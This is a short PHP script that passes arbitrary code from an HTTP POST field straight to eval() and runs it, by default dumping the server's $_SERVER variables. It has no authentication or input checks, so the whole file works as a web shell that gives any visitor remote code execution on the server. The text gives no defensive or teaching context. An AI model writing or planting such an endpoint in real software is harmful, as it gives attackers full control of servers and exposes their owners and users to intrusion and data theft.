<?php
if(!isset($_POST['code']))
    $_POST['code'] = 'print_r($_SERVER);';

if(isset($_POST['go']))
{
    if($_POST['pre']=="on")
    {
      echo "<pre>";
      eval($_POST['code']);
      echo "</pre>";
    }
    else
      eval($_POST['code']);
}
  
?>